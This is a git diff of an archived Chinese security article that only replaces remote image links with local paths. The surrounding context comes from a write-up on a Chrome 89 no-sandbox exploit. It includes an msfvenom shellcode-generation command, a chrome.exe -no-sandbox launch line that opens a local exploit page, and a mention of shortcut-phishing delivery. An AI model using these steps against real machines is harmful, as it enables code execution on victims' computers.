@@ -65,7 +65,7 @@ schema_version: "1"
 
 该漏洞主要利用在 - no-sandbox 模式下，也是有利用场景的，具体要看各位师傅怎么发挥啦！
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/rJALXSMzgelgYXUwsxribAz956ruaQGZZ9gezX82vCPAbp140PrhqtibLiaLnt6KmYJia7UhV1KICRTYojSS3v3f6g/640?wx_fmt=gif)
+![](../../.resource/remote/c4bdac024f2d01caf3806d4aed292ab79557dcef3cdeae81510fb1da16af2da5.gif)
 
   
 
@@ -81,7 +81,7 @@ schema_version: "1"
 msfvenom -a x64 -p windows/x64/exec CMD="msg.exe 1 By EDI" EXITFUNC=thread -f num
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZKhfZrTQtMBl1ZA6PLsNo4LvygPo5wNaQkTrvjdib1JI7h2BXHJGwPuQ/640?wx_fmt=png)
+![](../../.resource/remote/69fda3b475cd132a96142f0ac1dea7024f352cb0fd5ca1cc5dcfe975b93f9b45.png)
 
 当然你也可以选择使用 CS 的 shellcode 进行上线，我这里只是为了做测试，所以只弹了个 msg
 
@@ -204,13 +204,13 @@ wasm 的内存页是 RWX 可读可写可执行的，但是通过 C 转换后的 
 chrome.exe -no-sandbox
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZ4zJ7icysalghVqrxwMcU7hlx4mpgWiclXy0aHibATCk9mVcgSRvokUiaBw/640?wx_fmt=png)
+![](../../.resource/remote/801a22514c643f8d119358f65a31224de5bedf53204a8ff84b683e70d4de5475.png)
 
 切到 Chrome 所在目录即可
 
 效果如下
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZjiaYx5fHCCvb2diahKd9kBd9Kwbj4whPFEOA2Sc7Vq8AIHz7eoK3g4Mg/640?wx_fmt=png)
+![](../../.resource/remote/2bc4a204dc9257d90e2ad6aba069bbce6b33bd4dc0f3edc1d6ce5b45362c4b5a.png)
 
 ```
 测试环境
@@ -218,7 +218,7 @@ Windows10 x64
 Chrome 89.0.4389.128
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgelgYXUwsxribAz956ruaQGZZrQIEicgr0SBrJMribYKnGQx1fMgQxBNfVmTyamKIyib1w5h6EX9NqUT2w/640?wx_fmt=png)
+![](../../.resource/remote/fc0b243d8be7e45745d5120e83f172a8d28b8e950b4ba9754be767e6472c9200.png)
 
 关于该漏洞的利用，已经有师傅做了快捷方式钓鱼的形式进行投马、当然还有其它玩法。
 
@@ -226,7 +226,7 @@ Chrome 89.0.4389.128
 "C:\Program Files\Google\Chrome\Application\chrome.exe" -no-sandbox file:///C:/Users/admin/Desktop/exploits-master/chrome-0day/EDI.html
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/rJALXSMzgelgYXUwsxribAz956ruaQGZZqlufZgVCYOeKx2Vj7DkAibiciaQxDoNOBFCbevGiaxQOXKDrYFd7sY2X6A/640?wx_fmt=gif)
+![](../../.resource/remote/e5d7c4eec06de2a818d8c4830b926a8268883c8b55565b5d2d8a5703349ec38c.gif)
 
 ---
 
